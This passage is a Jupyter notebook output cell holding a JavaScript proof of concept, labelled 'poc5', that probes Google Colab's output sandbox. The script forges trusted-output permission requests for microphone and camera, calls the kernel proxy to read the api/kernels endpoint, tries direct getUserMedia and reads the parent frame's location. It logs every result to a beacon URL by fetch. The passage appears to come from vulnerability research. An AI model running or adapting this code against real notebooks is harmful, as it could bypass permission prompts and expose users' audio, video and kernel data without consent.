        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "\n(async function poc5() {\n  const B = 'https://colab.research.google.com/__poc5';\n  const log = async (tag, val) => {\n    try {\n      await fetch(B + '/' + tag + '?v=' + encodeURIComponent(String(val).slice(0,500)));\n    } catch(e) {}\n  };\n\n  await log('start', location.host + '|' + Date.now());\n\n  // TEST A: lk.isTrusted() via openUrl\n  try {\n    window.google.colab.openUrl('https://colab.research.google.com/__poc5/openUrl-probe');\n    await log('A_isTrusted', 'TRUE');\n  } catch(e) {\n    await log('A_isTrusted', 'false|' + e.message);\n  }\n\n  // TEST B: direct window.parent.postMessage for request_browser_permissions\n  window.parent.postMessage({\n    action: 'request_browser_permissions',\n    audio: true, video: true, isTrustedOutput: true, target: 'notebook'\n  }, '*');\n  await log('B_postMsg_sent', '1');\n\n  // TEST C: proxy_port with cache:true (non-gated path)\n  try {\n    const proxy = window.google.colab.kernel.proxyPort(8888, {cache: true});\n    await log('C_proxyPort_type', typeof proxy + '|keys=' + Object.keys(proxy||{}).join(','));\n    if (proxy && typeof proxy.then === 'function') {\n      try {\n        const resolved = await proxy;\n        await log('C_proxyPort_resolved', String(resolved));\n      } catch(e3) { await log('C_proxyPort_await_err', e3.message); }\n    } else if (proxy && proxy.url) {\n      await log('C_proxyPort_url', proxy.url.toString());\n      try {\n        const resp = await fetch(proxy.url.toString() + 'api/kernels');\n        await log('C_proxyPort_status', resp.status);\n        const text = await resp.text();\n        await log('C_proxyPort_body', text.slice(0,300));\n      } catch(e2) { await log('C_proxyPort_fetch_err', e2.message); }\n    }\n  } catch(e) { await log('C_proxyPort_threw', e.message); }\n\n  // TEST D: window.__colabOutputParams port access\n  const params = window.__colabOutputParams;\n  await log('D_params_exists', !!params + '|keys=' + (params ? Object.keys(params).join(',') : 'none'));\n  if (params && params.outputframePort) {\n    params.outputframePort.postMessage({\n      action: 'request_browser_permissions',\n      audio: true, video: true, isTrustedOutput: true, target: 'notebook'\n    });\n    await log('D_directPort_sent', '1');\n  }\n\n  // TEST E: check google.colab internal host\n  const gc = window.google && window.google.colab;\n  await log('E_gc_keys', gc ? Object.keys(gc).join(',') : 'no_gc');\n  if (gc && gc.host) {\n    await log('E_host_i', 'i=' + gc.host.i + '|g=' + !!gc.host.g);\n  } else {\n    await log('E_host', 'not_exposed');\n  }\n\n  // TEST F: getUserMedia direct\n  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {\n    try {\n      const stream = await navigator.mediaDevices.getUserMedia({audio: true});\n      await log('F_getUserMedia', 'SUCCESS_tracks=' + stream.getTracks().length);\n    } catch(e) { await log('F_getUserMedia', 'DENIED_' + e.name + '_' + e.message); }\n  } else { await log('F_getUserMedia', 'not_available'); }\n\n  // TEST G: parent frame location readability\n  try {\n    const loc = window.parent.location.href;\n    await log('G_parent_loc', 'readable:' + loc.slice(0,100));\n  } catch(e) { await log('G_parent_loc', 'blocked'); }\n\n  // TEST H: check if request_browser_permissions goes through via gk interceptor\n  // Try getUserMedia to trigger gk -> mk -> request_browser_permissions with lk.i\n  // We observe whether Colab dialog appears (isTrustedOutput=true) vs browser dialog (feature policy)\n  await log('done', Date.now());\n})();\n",
            "text/plain": [
